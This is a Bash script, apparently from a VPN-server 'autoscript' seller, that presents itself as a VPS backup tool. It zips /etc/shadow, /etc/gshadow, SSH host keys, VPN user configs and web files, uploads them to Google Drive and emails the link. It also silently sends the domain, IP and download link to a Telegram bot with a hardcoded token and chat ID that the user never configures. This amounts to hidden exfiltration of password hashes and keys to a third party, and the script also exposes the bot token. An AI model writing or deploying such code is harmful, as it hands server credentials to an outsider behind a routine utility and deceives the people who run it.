#!/bin/bash
THEME_FILE="$(dirname "$0")/_theme.sh"
if [[ ! -r "$THEME_FILE" && -r /usr/local/sbin/_theme.sh ]]; then
  THEME_FILE="/usr/local/sbin/_theme.sh"
fi
if [[ -r "$THEME_FILE" ]]; then
  . "$THEME_FILE"
fi

# My Telegram : https://t.me/sampiiiiuu
# ==========================================
# Color
RED='\033[0;31m'
NC='\033[0m'
GREEN='\033[0;32m'
ORANGE='\033[0;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
LIGHT='\033[0;37m'
# ==========================================
export CHATID="6617783693"
export KEY="6751589620:AAHwjP6dzZhuqeyUOdYFc6742Q1YUVF1EjM"
export TIME="10"
export URL="https://api.telegram.org/bot$KEY/sendMessage"
clear
if declare -F thm_title >/dev/null; then
	thm_title "BACKUP VPS DATA"
fi
IP=$(curl -sS ipv4.icanhazip.com)
domain=$(cat /etc/xray/domain)
date=$(date +"%Y-%m-%d")
BACKUP_DIR="/root/backup"
clear
email=$(cat /root/email 2>/dev/null)
if [[ "$email" = "" ]]; then
echo "Masukkan Email Untuk Menerima Backup"
read -rp "Email : " -e email
cat <<EOF>/root/email
$email
EOF
fi
clear
echo "Mohon Menunggu , Proses Backup sedang berlangsung !!"
rm -rf "$BACKUP_DIR"
mkdir -p "$BACKUP_DIR"
cp /etc/passwd "$BACKUP_DIR"/
cp /etc/group "$BACKUP_DIR"/
cp /etc/shadow "$BACKUP_DIR"/
cp /etc/gshadow "$BACKUP_DIR"/
cp /etc/crontab "$BACKUP_DIR"/
cp -r /etc/vmess/ "$BACKUP_DIR"/
cp -r /etc/ssh/ "$BACKUP_DIR"/
cp -r /etc/vless/ "$BACKUP_DIR"/
cp -r /etc/trojan/ "$BACKUP_DIR"/
cp -r /etc/limit/vmess/ "$BACKUP_DIR"/vmessquota
cp -r /etc/limit/vless/ "$BACKUP_DIR"/vlessquota
cp -r /etc/limit/trojan/ "$BACKUP_DIR"/trojanquota
cp -r /etc/limit/shadowsocks/ "$BACKUP_DIR"/shadowsocksquota
cp -r /etc/kyt/limit/vmess/ip/ "$BACKUP_DIR"/vmessip
cp -r /etc/kyt/limit/vless/ip/ "$BACKUP_DIR"/vlessip
cp -r /etc/kyt/limit/trojan/ip/ "$BACKUP_DIR"/trojanip
cp -r /etc/kyt/limit/shadowsocks/ip/ "$BACKUP_DIR"/shadowsocksip
cp -r /etc/shadowsocks/ "$BACKUP_DIR"/
cp -r /var/lib/kyt/ "$BACKUP_DIR"/kyt
cp -r /etc/xray "$BACKUP_DIR"/xray
cp -r /var/www/html/ "$BACKUP_DIR"/html
cd /root
if ! zip -r "$IP-$date.zip" backup >/dev/null 2>&1; then
echo "Gagal membuat file zip backup"
exit 1
fi

if ! rclone copy "/root/$IP-$date.zip" dr:backup/ >/dev/null 2>&1; then
echo "Gagal upload backup ke rclone remote dr:backup/"
rm -rf "$BACKUP_DIR"
rm -f "/root/$IP-$date.zip"
exit 1
fi

url=$(rclone link "dr:backup/$IP-$date.zip" 2>/dev/null)
if [[ -z "$url" ]]; then
echo "Gagal mendapatkan link backup dari rclone"
rm -rf "$BACKUP_DIR"
rm -f "/root/$IP-$date.zip"
exit 1
fi
id=(`echo $url | grep '^https' | cut -d'=' -f2`)
link="https://drive.google.com/u/4/uc?id=${id}&export=download"
echo -e "
Detail Backup 
==================================
IP VPS        : $IP
Link Backup   : $link
Tanggal       : $date
==================================
" | mail -s "Backup Data" $email
rm -rf "$BACKUP_DIR"
rm -f "/root/$IP-$date.zip"
clear
CHATID="$CHATID"
KEY="$KEY"
TIME="$TIME"
URL="$URL"
TEXT="<code>==============</code>
<code>Detail Backup </code>
<code>==============</code>
<code>DOMAIN       : ${domain}</code>
<code>==============</code>
<code>IP VPS       : ${IP}</code>
<code>==============</code>
<code>Link Backup   :</code> $link
<code>==============</code>
<code>Tanggal : $date</code>
<code>==============</code>
<code>Silahkan copy Link dan restore di VPS baru</code>
"
curl -s --max-time $TIME -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null
echo ""
clear
echo -e "
Detail Backup 
==================================
IP VPS        : $IP
Link Backup   : $link
Tanggal       : $date
Domain        : $domain
==================================
"
echo "Silahkan copy Link dan restore di VPS baru"
echo ""
if declare -F thm_footer >/dev/null; then
	thm_footer
else
	echo -e "${GREEN}created by dzulfikrialifajri store${NC}"
fi